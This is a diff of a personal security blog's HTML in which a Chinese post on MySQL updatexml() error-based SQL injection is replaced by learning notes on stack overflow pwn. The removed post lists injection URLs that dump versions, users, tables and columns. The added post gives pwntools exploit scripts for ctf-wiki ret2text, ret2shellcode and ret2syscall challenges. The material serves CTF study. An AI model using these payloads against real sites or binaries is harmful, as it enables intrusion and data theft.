@@ -15,26 +15,26 @@
 
 
 
-<meta name="description" content="0x01updatexml()的正常作用updatexml()是MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数。">
+<meta name="description" content="某年某日,应队伍缺pwn,故学习于ctf-wiki.学其有感,写文以记之。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="关于updatexml()报错注入的思考">
-<meta property="og:url" content="lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/index.html">
+<meta property="og:title" content="学习pwn小记(1)">
+<meta property="og:url" content="lexsd6.github.io/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/index.html">
 <meta property="og:site_name" content="lexsd6&#39;s home">
-<meta property="og:description" content="0x01updatexml()的正常作用updatexml()是MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数。">
+<meta property="og:description" content="某年某日,应队伍缺pwn,故学习于ctf-wiki.学其有感,写文以记之。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/iamge-updatexml1.png">
-<meta property="og:image" content="lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/image-20200320235648716.png">
-<meta property="og:image" content="lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/image-20200321131351700.png">
-<meta property="og:image" content="lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/image-20200321002711168.png">
-<meta property="og:image" content="lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/image-20200321160707020.png">
-<meta property="og:image" content="lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/image-20200321161640552.png">
-<meta property="og:image" content="lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/image-20200324151215694.png">
-<meta property="article:published_time" content="2019-11-13T01:23:36.000Z">
-<meta property="article:modified_time" content="2020-05-17T16:03:03.434Z">
+<meta property="og:image" content="lexsd6.github.io/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/image-20200909214148691.png">
+<meta property="og:image" content="lexsd6.github.io/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/image-20200911231138664.png">
+<meta property="og:image" content="lexsd6.github.io/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/image-20200911220549058.png">
+<meta property="og:image" content="lexsd6.github.io/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/image-20200911110700992.png">
+<meta property="og:image" content="lexsd6.github.io/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/image-20200911223653876.png">
+<meta property="og:image" content="lexsd6.github.io/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/image-20200912105057908.png">
+<meta property="og:image" content="lexsd6.github.io/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/image-20200912115324139.png">
+<meta property="article:published_time" content="2020-09-09T13:11:47.145Z">
+<meta property="article:modified_time" content="2020-09-12T10:17:37.481Z">
 <meta property="article:author" content="lexsd6">
-<meta property="article:tag" content="mysql">
+<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/iamge-updatexml1.png">
+<meta name="twitter:image" content="lexsd6.github.io/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/image-20200909214148691.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -68,7 +68,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>关于updatexml()报错注入的思考 | lexsd6&#39;s home</title>
+<title>学习pwn小记(1) | lexsd6&#39;s home</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -268,11 +268,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-关于updatexml()报错注入的思考" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-学习pwn小记(1)" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/" class="article-date">
-      <time datetime="2019-11-13T01:23:36.000Z" itemprop="datePublished">2019-11-13</time>
+      <a href="/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/" class="article-date">
+      <time datetime="2020-09-09T13:11:47.145Z" itemprop="datePublished">2020-09-09</time>
 </a>
 
 
@@ -287,7 +287,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      关于updatexml()报错注入的思考
+      学习pwn小记(1)
     </h1>
   
 
@@ -302,7 +302,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/mysql/" rel="tag">mysql</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -312,41 +312,76 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="0x01updatexml-的正常作用"><a href="#0x01updatexml-的正常作用" class="headerlink" title="0x01updatexml()的正常作用"></a>0x01updatexml()的正常作用</h2><p>updatexml()是MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数。<a id="more"></a>其正常语法：<br><code>UPDATEXML (XML_document, XPath_string, new_value);</code><br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值</p>
-<p>如下是关于它正常用法的掩饰。</p>
-<p>(1)执行如下sql语言创建环境：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE  xml1 (xxx VARCHAR(150));#创建一个表</span><br><span class="line">INSERT INTO xml1 VALUES</span><br><span class="line">(&#39;</span><br><span class="line">&lt;values&gt; </span><br><span class="line">&lt;name&gt;lexsd6&lt;&#x2F;name&gt;</span><br><span class="line">&lt;text&gt;frist xml date&lt;&#x2F;text&gt;</span><br><span class="line">&lt;&#x2F;values&gt;&#39;);#插入第一个数据</span><br><span class="line">INSERT INTO xml1 VALUES</span><br><span class="line">(&#39;</span><br><span class="line">&lt;values&gt; </span><br><span class="line">&lt;name&gt;lexs&lt;&#x2F;name&gt;</span><br><span class="line">&lt;text&gt;secend xml date&lt;&#x2F;text&gt;</span><br><span class="line">&lt;&#x2F;values&gt;&#39;);#插入第二个数据</span><br></pre></td></tr></table></figure>
+        <p>某年某日,应队伍缺pwn,故学习于ctf-wiki.学其有感,写文以记之。</p>
+<a id="more"></a>
 
-<p>(2) 使用<code>select * from xml1</code>查看</p>
-<p><img src="iamge-updatexml1.png" alt="updatexml1"></p>
-<p>（3）执行<code>SELECT updatexml(title,&#39;/values/text&#39;,&#39;one&#39;) FROM xml1;</code>语句。发现执行后，原来有<text>标签的地方连同标签里的内容都被替换成了‘one’。</p>
-<p><img src="image-20200320235648716.png" alt="image-20200320235648716"></p>
-<h2 id="0x02updatexml-报错注入的原因及注意点"><a href="#0x02updatexml-报错注入的原因及注意点" class="headerlink" title="0x02updatexml()报错注入的原因及注意点"></a>0x02updatexml()报错注入的原因及注意点</h2><p>由于updatexml的第二个参数需要<u><strong>Xpath</strong></u>格式的字符串,但如果在提交的不符合和Xpath格式,会用报错的形式将执行后的结果回显出了来.</p>
-<p>例如:执行sql语句<code>select updatexml(1,concat(0x7e,(select database()),0x7e),1);</code>后,可以看到回显:</p>
-<p><img src="image-20200321131351700.png" alt="image-20200321131351700"></p>
-<p>如上图,原本<code>select database()</code>的地方被执行了,显示出数据库名–bookshop.</p>
-<p>在这里要注意的事：</p>
-<p>(1.)由于updatexml的保错回显只能返回一个属性，所以如果一个表中用多行，需要用‘limit’来限制行数（元组数）为一。</p>
-<p>(2.)在构建第二个参数时，要确保第二个参数不符合Xpath格式。有的函数符合Xpath格式可以用concat(‘不符合Xpath格式的字符串’,’要执行的恶意sql语句’)来构造’’</p>
-<p><img src="image-20200321002711168.png" alt="image-20200321002711168"></p>
-<p>(3.)若要注入出的数据格式就是xml结构的数据则可以直接在第二个参数select:</p>
-<p><img src="image-20200321160707020.png" alt="image-20200321160707020"></p>
-<p>(4.)用这个方法注出来的数据有长度限制。且在恶意代码前的参数字符越多，注出的有效信息越少。（如下图）.</p>
-<p><img src="image-20200321161640552.png" alt="image-20200321161640552"></p>
-<p>so在有一张表有多行时最好用limit 一行一行查询,慎重使用group_concat函数.(group_concat可能显示不全,用substr来截取拼接)</p>
-<p><img src="image-20200324151215694.png" alt="image-20200324151215694"></p>
-<h2 id="0x03updatexml-的注入"><a href="#0x03updatexml-的注入" class="headerlink" title="0x03updatexml()的注入"></a>0x03updatexml()的注入</h2><p>(1.)爆数据库版本信息</p>
-<p><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) ;#</p>
-<p>(2.)爆出用户</p>
-<p><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)  ;#</p>
-<p>(3.)爆出所用数据库</p>
-<p><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) ；#</p>
-<p>(4.)爆全部数据库</p>
-<p><a href="http://www.hackblog.cn/sql.php?id=1" target="_blank" rel="noopener">http://www.hackblog.cn/sql.php?id=1</a> and uand  updatexml(1,concat(0x7e,(SELECT schema_name from information_schema.SCHEMATA  limit 0,1),0x7e),1);#</p>
-<p>(5.)爆表<br><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1);#</p>
-<p>(6.)爆字段</p>
-<p><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT column_name from information_schema.columns where table_name=’xml1’ limit 0,1),0x7e),1);#</p>
-<p>(7.)爆字段内容<br><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and  updatexml(1,concat(0x7e,(SELECT  title from xml1 limit 0,1),0x7e),1);#</p>
+<h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。</p>
+<p><img src="image-20200909214148691.png" alt="image-20200909214148691"></p>
+<p>如图，想要利用触发栈溢出程序必须向<strong>栈上写入数据</strong>和<strong>写入的数据大小没有被良好地控制</strong></p>
+<h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><h4 id="关于输入的危险函数"><a href="#关于输入的危险函数" class="headerlink" title="关于输入的危险函数"></a>关于输入的危险函数</h4><p>​    gets()，直接读取一行，忽略’\x00’<br>​            scanf()<br>​            vscanf()</p>
+<h4 id="关于输出的危险函数"><a href="#关于输出的危险函数" class="headerlink" title="关于输出的危险函数"></a>关于输出的危险函数</h4><p>   sprintf()</p>
+<h4 id="关于字符串操作的危险函数"><a href="#关于字符串操作的危险函数" class="headerlink" title="关于字符串操作的危险函数"></a>关于字符串操作的危险函数</h4><p>​    strcpy，字符串复制，遇到’\x00’停止<br>​            strcat，字符串拼接，遇到’\x00’停止<br>​            bcopy</p>
+<h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><p>这一部分主要是计算我们所要操作的地址与我们所要覆盖的地址的距离。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p>
+<ul>
+<li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li>
+<li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li>
+<li>直接地址索引，就相当于直接给定了地址。</li>
+</ul>
+<p>一般来说，我们会有如下的覆盖需求</p>
+<ul>
+<li>覆盖函数返回地址，这时候就是直接看 EBP 即可。</li>
+<li>覆盖栈上某个变量的内容，这时候就需要更加精细的计算了。</li>
+<li>覆盖 bss 段某个变量的内容。</li>
+<li>根据现实执行情况，覆盖特定的变量或地址的内容。</li>
+</ul>
+<p>ps：我们覆盖某个地址的目的是为了让程序读取我们覆盖的恶意地址来达到我们的目的，执行我们想要执行的东西。</p>
+<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>emm,这道题保护只开了栈不可执行,对我来说影响深刻的反而是找buf的大小的问题。</p>
+<p><img src="image-20200911231138664.png" alt="image-20200911231138664"></p>
+<p>照着以前对pwn薄弱理解，打开ide看到了：</p>
+<p><img src="image-20200911220549058.png" alt="image-20200911220549058"></p>
+<p>然后照ebp算出的要溢出：0x64+4个（104）字符才能溢出到返回地址。</p>
+<p>但是在gdb出来却是：</p>
+<p><img src="image-20200911110700992.png" alt="image-20200911110700992"></p>
+<p>经过测试要溢出的字符的确是108个。才能覆盖返回地址。</p>
+<p>通过收查资料发现，ebp存储着当前栈帧的栈底的地址是通常作为基址。而变量地址是通过通过ebp和偏移相加减来获取。但esp始终指向栈顶，随栈内数据增加或减少而变。同时ida是IDA是静态调试gdb是动态调试，所以ida计算偏移可能有误差，导致我们通过ebp计算出来有误差。（所以还是最好用动态调试）</p>
+<p>然后就返回地址的问题，这里学到一个新的知识吧，返回0x804864A就可以将/bin/sh传入system执行。（</p>
+<p><img src="image-20200911223653876.png" alt="image-20200911223653876"></p>
+<p>然后溢出大小控制了返回地址也确定了，这题就好做了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./ret2text'</span>)</span><br><span class="line"></span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">108</span>+<span class="string">'bbbb'</span>+p32(<span class="number">0x0804863A</span>) </span><br><span class="line"><span class="comment">#pay='a'*108+'bbbb'+p32(e.got['system'])+p32(0)+p32(0x08048763)#这个是调用system手动传入内置的‘/bin/sh’</span></span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>这道题没有看到system与/bin/sh，但看到nx没防护,在vmap下发现buf有读写执行的能力,所以想要手动写入shell。</p>
+<p><img src="image-20200912105057908.png" alt="image-20200912105057908"></p>
+<p><img src="image-20200912115324139.png" alt="image-20200912115324139"></p>
+<p>于是借着strncpy写入shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./ret2shellcode'</span>)</span><br><span class="line">e=ELF(<span class="string">'./ret2shellcode'</span>)</span><br><span class="line">shell=asm(shellcraft.sh())</span><br><span class="line">lang=<span class="number">108</span>+<span class="number">4</span>-len(shell)</span><br><span class="line">pay=shell+<span class="string">'a'</span>*lang+p32(<span class="number">0x0804A080</span>)<span class="comment">#让buf前面是shell，后面是溢出数据，最后是buf地址</span></span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>这道题,本菜鸡感觉学到两个知识点用系统调用的方法来处理函数和ROPgadget的使用.当我们获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。于是我们可以构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;&#x2F;bin&#x2F;sh&quot;,NULL,NULL)</span><br><span class="line">可以理解为调用int 0x80(eax,ebx,ecx,edx)</span><br><span class="line">即：</span><br><span class="line">系统调用号，即 eax 应该为表execve的 0xb</span><br><span class="line">第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。</span><br><span class="line">第二个参数，即 ecx 应该为 0</span><br><span class="line">第三个参数，即 edx 应该为 0</span><br><span class="line"></span><br><span class="line">构造payload的框架大体是：</span><br><span class="line">溢出数据 eax地址 eax的值 ebx地址  ebx值  ecx地址 ecx 值 edx 值 edx 值 0x80地址</span><br></pre></td></tr></table></figure>
+
+<p>eax、ebx、ecx、edx这些寄存器可以地址可以用ROPgadget来得到。这里说下ROPgadge是使用</p>
+<p>查找可存储寄存器的地址：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only 'pop|ret' | grep  '寄存器'</span><br><span class="line"><span class="meta">#</span><span class="bash">例</span></span><br><span class="line">ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'</span><br></pre></td></tr></table></figure>
+
+<p>查找某字符串地址：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --string  "字符串“</span><br><span class="line"><span class="meta">#</span><span class="bash">例</span></span><br><span class="line">ROPgadget --binary rop --string "/bin/sh"</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查找有int 0x80的地址：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only 'int'</span><br></pre></td></tr></table></figure>
+
+<p>这样下来payload就容易构造了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./rop'</span>)</span><br><span class="line">e=ELF(<span class="string">'./rop'</span>)</span><br><span class="line"></span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">112</span>+p32(<span class="number">0x080bb196</span>)+p32(<span class="number">0xb</span>)+p32(<span class="number">0x0806eb90</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x080be408</span>)+p32(<span class="number">0x08049421</span>)</span><br><span class="line"><span class="comment">#pay溢出数据+eax地址+eax的值+ebx地址+ebx值+ecx地址+ecx 值 +edx 地址 +edx 值+0x80地址</span></span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>ps：由于v0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret   ，so先传cdx，ecx，再ebx。</p>
+<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/</a></p>
+<p><a href="https://www.jianshu.com/p/dd5fd511e0d3" target="_blank" rel="noopener">https://www.jianshu.com/p/dd5fd511e0d3</a></p>
 
       
     </div>
@@ -355,13 +390,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/">关于updatexml()报错注入的思考</a></p>
+        <p><span>本文标题:</span><a href="/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/">学习pwn小记(1)</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">lexsd6</a></p>
-        <p><span>发布时间:</span>2019-11-13, 09:23:36</p>
-        <p><span>最后更新:</span>2020-05-18, 00:03:03</p>
+        <p><span>发布时间:</span>2020-09-09, 21:11:47</p>
+        <p><span>最后更新:</span>2020-09-12, 18:17:37</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/" title="关于updatexml()报错注入的思考">lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/</a>
-            <span class="copy-path" data-clipboard-text="原文: lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/　　作者: lexsd6" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/" title="学习pwn小记(1)">lexsd6.github.io/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/</a>
+            <span class="copy-path" data-clipboard-text="原文: lexsd6.github.io/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/　　作者: lexsd6" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -373,16 +408,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/">
-                    关于python ssti的思考
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2019/10/03/hello-world/">
-                    Hello World
+                <a href="/2020/08/12/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">
+                    关于SQL注入小记
                 </a>
             </div>
         
@@ -394,7 +423,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01updatexml-的正常作用"><span class="toc-text">0x01updatexml()的正常作用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02updatexml-报错注入的原因及注意点"><span class="toc-text">0x02updatexml()报错注入的原因及注意点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03updatexml-的注入"><span class="toc-text">0x03updatexml()的注入</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#栈溢出"><span class="toc-text">栈溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#寻找危险函数"><span class="toc-text">寻找危险函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#关于输入的危险函数"><span class="toc-text">关于输入的危险函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#关于输出的危险函数"><span class="toc-text">关于输出的危险函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#关于字符串操作的危险函数"><span class="toc-text">关于字符串操作的危险函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#确定填充长度"><span class="toc-text">确定填充长度</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2text"><span class="toc-text">ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2shellcode"><span class="toc-text">ret2shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2syscall"><span class="toc-text">ret2syscall</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考文献"><span class="toc-text">参考文献</span></a></li></ol>
         
     </div>
     <style>
@@ -430,7 +459,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"关于updatexml()报错注入的思考　| lexsd6's home　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"学习pwn小记(1)　| lexsd6's home　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -450,15 +479,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/" title="上一篇: 关于python ssti的思考">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2019/10/03/hello-world/" title="下一篇: Hello World">
+            <a href="/2020/08/12/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" title="下一篇: 关于SQL注入小记">
                 <i class="fa fa-angle-right"></i>
             </a>
         
